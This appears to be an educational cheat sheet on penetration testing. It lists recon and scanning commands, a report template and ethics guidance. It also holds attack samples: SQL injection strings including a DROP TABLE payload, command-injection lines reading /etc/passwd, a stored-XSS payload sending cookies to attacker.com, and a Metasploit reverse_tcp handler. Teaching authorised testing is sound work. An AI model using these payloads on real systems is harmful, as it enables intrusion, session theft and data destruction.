# Penetration Testing Basics

## Reconnaissance

### Information Gathering

```bash
# DNS enumeration
dig example.com ANY
nslookup example.com

# Subdomain enumeration
subfinder -d example.com
amass enum -d example.com

# Port scanning
nmap -sV -sC -p- example.com

# Technology detection
whatweb example.com
wappalyzer
```

---

## Vulnerability Scanning

```bash
# Nikto web server scanner
nikto -h https://example.com

# SSL/TLS testing
testssl.sh example.com

# Directory brute-forcing
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
```

---

## Manual Testing Techniques

### SQL Injection

```sql
-- Test for SQL injection
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL, NULL, NULL--
'; DROP TABLE users; --

-- Error-based SQLi
' AND 1=CONVERT(int, (SELECT @@version))--

-- Time-based blind SQLi
' AND IF(1=1, SLEEP(5), 0)--
```

### Cross-Site Scripting (XSS)

```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

<!-- Stored XSS -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

<!-- DOM-based XSS -->
<script>
  location.href = 'javascript:alert("XSS")'
</script>
```

### Command Injection

```bash
# Test for command injection
; ls -la
| whoami
`cat /etc/passwd`
$(cat /etc/passwd)
```

---

## Burp Suite Testing

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Browse application
3. Analyze HTTP history
4. Use Repeater to modify requests
5. Use Intruder for brute-force attacks
6. Use Scanner (Pro) for automated scanning
```

---

## API Security Testing

```bash
# Test for broken authentication
curl -X GET https://api.example.com/admin/users \
  -H "Authorization: Bearer eyJhbGc..."

# Test for IDOR
curl https://api.example.com/users/123/profile  # Your user ID
curl https://api.example.com/users/999/profile  # Try another user

# Test for mass assignment
curl -X PATCH https://api.example.com/users/me \
  -d '{"role": "admin"}'  # Attempt privilege escalation

# Test rate limiting
for i in {1..1000}; do
  curl https://api.example.com/api/login -d '{"username":"test","password":"test"}'
done
```

---

## Exploitation (Ethical Only!)

```bash
# SQLMap for automated SQL injection
sqlmap -u "http://example.com/product?id=1" --dbs

# Metasploit for exploitation
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
exploit
```

---

## Reporting Vulnerabilities

```markdown
# Vulnerability Report Template

**Title:** SQL Injection in Login Form

**Severity:** High

**Description:**
The login endpoint (/api/login) is vulnerable to SQL injection through the username parameter.

**Steps to Reproduce:**
1. Navigate to https://example.com/login
2. Enter username: `' OR '1'='1`
3. Enter password: `anything`
4. Click "Login"

**Expected Result:** Login should fail

**Actual Result:** Authenticated as admin user

**Impact:**
- Attacker can bypass authentication
- Access to all user accounts
- Potential data exfiltration

**Proof of Concept:**
```sql
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": "' OR '1'='1", "password": "anything"}
```

**Recommendation:**
Use parameterized queries:
```javascript
// ❌ Vulnerable
const query = `SELECT * FROM users WHERE username = '${username}'`;

// ✅ Secure
const query = 'SELECT * FROM users WHERE username = ?';
db.execute(query, [username]);
```

**CVSS Score:** 8.1 (High)

**References:**
- OWASP: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection
```

---

## Ethical Considerations

**✅ Do:**
- Get written permission before testing
- Test only in-scope systems
- Report all findings responsibly
- Follow coordinated disclosure

**❌ Don't:**
- Test production systems without permission
- Exploit vulnerabilities for personal gain
- Disclose vulnerabilities publicly before fix
- Damage or delete data

---

## Certifications

- CEH (Certified Ethical Hacker)
- OSCP (Offensive Security Certified Professional)
- GWAPT (Web Application Penetration Tester)

---

## Exercise

**Conduct Ethical Pentest:**

For a test environment:
1. Perform reconnaissance
2. Identify 5+ vulnerabilities
3. Write detailed vulnerability reports
4. Create remediation plan

**Deliverable:** Professional penetration test report.
